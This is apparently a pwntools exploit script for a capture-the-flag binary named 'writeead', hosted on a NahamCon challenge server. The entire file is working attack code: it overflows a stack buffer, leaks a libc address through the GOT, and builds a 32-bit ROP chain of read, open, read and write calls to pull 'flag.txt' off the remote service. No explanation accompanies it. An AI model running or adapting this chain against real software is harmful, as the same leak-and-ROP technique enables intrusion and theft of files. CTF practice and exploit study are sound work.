#!/usr/bin/python3

from pwn import *

exe = ELF("./writeead")

#r = remote("127.0.0.1", 9999)
r = remote("challenge.nahamcon.com", 31481)
#r = process("writeead")

r.recvline()
offset = 0x3f7

payload  = b"M"*(offset-4)
payload += p32(exe.plt["write"])
payload += p32(0x804928c)
payload += p32(0)
payload += p32(exe.got['write'])
payload += p32(0x8)
r.sendline(payload)

write = u32(r.recv(4))
log.warn("Write leak @ 0x%x", write)

libc_base = write - 0xf5ca0
clean = libc_base + 0x71deb # pop 3 times
bss = 0x804c040
open_ = libc_base + 0xf57e0

payload  = b"M"*(offset-4)
payload += p32(exe.plt['read'])
payload += p32(clean)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(open_)
payload += p32(clean)
payload += p32(bss)
payload += p32(0)
payload += p32(0)

payload += p32(exe.plt.read)
payload += p32(clean)
payload += p32(1)
payload += p32(bss)
payload += p32(0x100)

payload += p32(exe.plt.write)
payload += p32(clean)
payload += p32(0)
payload += p32(bss)
payload += p32(0x100)

r.sendline(payload)
r.sendline("flag.txt")

r.interactive()
